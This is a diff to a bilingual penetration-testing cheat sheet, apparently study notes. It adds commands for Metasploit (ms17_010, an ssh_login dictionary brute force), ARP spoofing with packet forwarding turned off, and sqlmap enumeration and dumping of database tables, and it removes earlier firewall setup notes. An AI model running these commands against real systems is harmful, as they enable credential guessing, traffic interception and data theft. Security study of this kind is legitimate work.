@@ -1,9 +1,16 @@
 # msfconsole
 
 ```bash
-msfconsole
-# 进入控制台
+snap install metasploit-framework
+# Download the package
 ```
+
+```bash
+msfconsole
+# Enter the console
+```
+
+## ms17_010
 
 search ms17_010 
 
@@ -69,32 +76,60 @@ Microsoft Windows [�汾 6.1.7601]
 
 show options 
 
-# ufw
 
-- apt update 
-- apt -y install ufw 
 
-\#install ufw 
+## ssh_login
 
-- ufw enable 
+```bash
+search ssh_login
 
-\#turn on ufw 
+use 
 
-- ufw allow 80 
+set RHOSTS target
+set USER_FILE /path/to/user_dict
+set PASS_FILE /path/to/pass_dict
+# The file type should be txt
+```
 
-\#open port 80 
+```bash
+vim password.txt
+```
 
-- ufw status 
 
-\#check the port open 
+
+
 
 # arpspoof
+
+[ARP欺骗工具arpspoof的用法](https://blog.csdn.net/who_im_i/article/details/120234324)
 
 ```bash
 apt install -y dsniff ssldump
 ```
 
+设置是否为目标和主机转发流量，0为不转发
+```bash
+echo 0 > /proc/sys/net/ipv4/ip_forward
+```
+
+arp欺骗，需要指定相关网卡。
 ```bash
 arpspoof -i eth0 -t target -r host
+```
+
+
+
+# sqlmap
+
+扫描当前数据库
+
+```bash
+sqlmap -u "url" --cookie="cookie" --current-db
+```
+
+```bash
+sqlmap -u "url" --cookie="cookie" -D database --tables
+sqlmap -u "url" --cookie="cookie" -D database -T table --columns
+sqlmap -u "url" --cookie="cookie" -D database -T table -C col1,col2 --dump
 ```
 
